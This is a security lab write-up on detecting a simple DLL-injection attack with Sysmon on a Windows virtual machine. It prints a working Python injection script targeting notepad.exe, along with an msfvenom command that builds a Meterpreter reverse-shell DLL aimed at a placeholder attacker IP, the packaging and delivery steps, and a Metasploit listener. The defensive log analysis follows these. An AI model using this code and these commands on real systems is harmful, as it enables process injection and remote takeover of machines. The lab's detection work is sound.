# Detection of Simple DLL Injection with Sysmon

## Introduction

In this lab, I infected a virtual Windows machine with an executable containing a simple payload.  
The executable was written in Python and its objective was to inject a DLL into a running Windows service (Notepad).  
The primary goal was to detect signs of this malicious behavior through Sysmon logs and evaluate how native Windows defenses respond.

**Tools Used**: Sysmon, Metasploit, Wine, Kali Linux, Event Viewer, Python, PyInstaller, Oracle VirtualBox

---

## Malware Creation and Delivery

### Creating the Injection Script

To perform DLL injection, I used a simple Python script found online.

```python
import ctypes
import ctypes.wintypes as wintypes
import psutil

# Initialize kernel32
kernel32 = ctypes.WinDLL("kernel32.dll", use_last_error=True)

# Constants
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x00001000
PAGE_READWRITE = 0x04

# Function to get notepad's PID
def get_notepad_pid():
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'].lower() == 'notepad.exe':
            return proc.info['pid']
    return None

# Get notepad's PID
pid = get_notepad_pid()
if not pid:
    print("Notepad not found")
    exit(1)

# Path to payload
dll_path = "test2.dll"

# Open target process
h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)

# Allocate memory in target process
arg_address = kernel32.VirtualAllocEx(h_process, 0, len(dll_path) + 1, MEM_COMMIT, PAGE_READWRITE)

# Write DLL path to allocated memory
written = ctypes.c_size_t(0)
kernel32.WriteProcessMemory(h_process, arg_address, dll_path.encode('utf-8'), len(dll_path) + 1, ctypes.byref(written))

# Get LoadLibraryA address
h_kernel32 = kernel32.GetModuleHandleA(b'kernel32.dll')
load_library = kernel32.GetProcAddress(h_kernel32, b'LoadLibraryA')

# Create remote thread in target process
kernel32.CreateRemoteThread(h_process, None, 0, load_library, arg_address, 0, None)
```

The PID of the process changes every time that a new process is run, so it was necessary to insert this 
function to find the PID of the notepad automatically:

```python
def get_notepad_pid():
   for proc in psutil.process_iter(['pid', 'name']):
       if proc.info['name'].lower() == 'notepad.exe':
          return proc.info['pid']
   return None

pid = get_notepad_pid()
```

### Embedding the Payload

Was generated the malicious DLL payload using Metasploit's `msfvenom`:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f dll > test.dll
```

### Creating the Executable

Initially, I used PyInstaller to compile the Python script into an executable. However, running the resulting binary on the target machine failed due to environment compatibility issues.  
To solve this, I used **Wine** on Kali Linux to simulate a Windows environment and generate a compatible executable.


1. **Steps**

```bash
wget https://www.python.org/ftp/python/3.10.9/python-3.10.9-amd64.exe
wine python-3.10.9-amd64.exe
wine cmd
python -m pip install pyinstaller
pyinstaller --onefile --add-data "payload.dll;." injection.py
```

### Delivery Method

To deliver the payload, I used a simple Python HTTP server on the attacker machine and set up a listener.

```bash
python3 -m http.server 8000
```
![Image](https://github.com/user-attachments/assets/8654a2ea-66e0-465f-bfb9-918f40ed46b8)

ON THE TARGET MACHINE:

![Image](https://github.com/user-attachments/assets/b5750b38-2ac5-400a-9140-10c168948a44)
---

## Execution on the Target Machine and Sysmon Log Analysis

Despite disabling basic Windows Defender features, getting a stable reverse connection was challenging. Still, Sysmon successfully logged multiple indicators of compromise.

![Image](https://github.com/user-attachments/assets/0255d64d-235d-4f04-9724-b835fa43fb43)

---

## Log Analysis

### Event ID 1: Process Creation

```
UtcTime: 2025-05-08 13:21:20.798
ProcessId: 6392
Image: C:\Users\home\Downloads\injection.exe
ParentImage: C:\Windows\explorer.exe
Hashes: MD5=..., SHA256=...
```

**Explanation**: Event ID 1 logs every process creation. Although not inherently malicious, indicators like missing file metadata and hash verification help identify suspicious files.  
The parent process being `explorer.exe` suggests user interaction (manual execution).

### Event ID 13: Registry Modification

```
UtcTime: 2025-05-08 13:21:22.977
Image: C:\Windows\system32\svchost.exe
TargetObject: HKU\...\AppCompatFlags\Compatibility Assistant\Store\...injection.exe
```

**Explanation**: This shows `svchost.exe` modifying the registry to store information about the executed file.  
Windows uses this Compatibility Assistant key when unusual behavior is detected.

### Event ID 5: Process Terminated

```
UtcTime: 2025-05-08 13:21:20.958
ProcessId: 6392
Image: C:\Users\home\Downloads\injection.exe
```

**Explanation**: The process was terminated shortly after execution, possibly due to Windows security defenses or a code error.  
To proceed with the Sysmon log analysis, I created a simpler malware sample whose only purpose was to initiate a remote connection.

```bash
msfconsole

use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST ##.##.##.##
set LPORT 4444
run
```


![Image](https://github.com/user-attachments/assets/654d581d-448b-41fd-9989-a6007542fccf)

### Event ID 3: Network Connection

```
UtcTime: 2025-05-08 17:16:34.953
ProcessId: 5104
Image: C:\Users\home\Downloads\final.exe
DestinationIp: ##.##.##.#
DestinationPort: 4444
```

**Explanation**: This log confirms the reverse shell behavior. `final.exe` attempts to connect to the attacker's listener, typically used by tools like Metasploit.

---

## Conclusion

This lab demonstrates that even basic malware leaves detectable traces in Sysmon logs.  
Events such as process creation, registry modification, and network activity are powerful indicators for defenders.  
Despite some execution challenges, the experiment shows the effectiveness of endpoint monitoring and highlights the importance of log analysis for incident detection.
